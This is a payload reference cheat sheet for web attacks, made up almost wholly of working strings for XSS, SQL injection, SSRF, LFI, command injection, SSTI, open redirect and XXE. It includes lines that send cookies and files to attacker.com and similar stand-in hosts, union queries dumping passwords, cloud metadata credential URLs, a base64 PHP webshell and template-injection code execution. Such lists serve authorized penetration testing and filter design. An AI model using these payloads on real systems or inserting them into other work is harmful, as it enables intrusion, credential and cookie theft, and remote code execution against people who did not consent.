# Payloads Reference

---

## XSS Payloads

```javascript
// Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

// No parentheses
<img src=x onerror=alert`1`>
<svg/onload=alert`document.domain`>

// Filter evasion
<ScRiPt>alert(1)</sCrIpT>
<svg><script>alert(1)</script></svg>
<iframe srcdoc="<script>alert(1)</script>">
<object data="javascript:alert(1)">

// HTML entity encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

// Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// DOM XSS (URL hash)
#<script>alert(1)</script>
#"><img src=x onerror=alert(1)>

// Cookie exfil
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">
```

---

## SQL Injection Payloads

```sql
-- Error-based detection
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--

-- Boolean-based
1 AND 1=1
1 AND 1=2
' AND 1=1--
' AND 1=2--

-- Time-based MySQL
' AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- Time-based MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Time-based PostgreSQL
'; SELECT pg_sleep(5)--

-- Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT @@version,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username,password FROM users--

-- Out-of-band MySQL
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
```

---

## SSRF Payloads

```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP Metadata (requires header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Localhost bypass
http://localhost
http://127.0.0.1
http://[::1]
http://0.0.0.0
http://0/
http://127.1
http://2130706433    # decimal 127.0.0.1
http://0177.0.0.1    # octal
http://0x7f000001    # hex

# Protocol abuse
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0D%0A
```

---

## LFI Payloads

```
../../../../etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
expect://id

# Windows
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

---

## Command Injection Payloads

```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
%0d%0aid

# Time-based blind
; sleep 5
| sleep 5
$(sleep 5)

# OOB detection
; curl http://attacker.interactsh.com
; nslookup $(whoami).attacker.com
$(curl http://attacker.interactsh.com)
```

---

## SSTI Payloads

```
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
*{7*7}

# Jinja2 RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB RCE
<%= `id` %>
```

---

## Open Redirect Payloads

```
https://evil.com
http://evil.com
//evil.com
\/\/evil.com
/\evil.com
https://target.com@evil.com
https://evil.com/target.com
javascript:alert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## XXE Payloads

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<data>&xxe;</data>

<!-- OOB XXE -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&exfil;</data>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
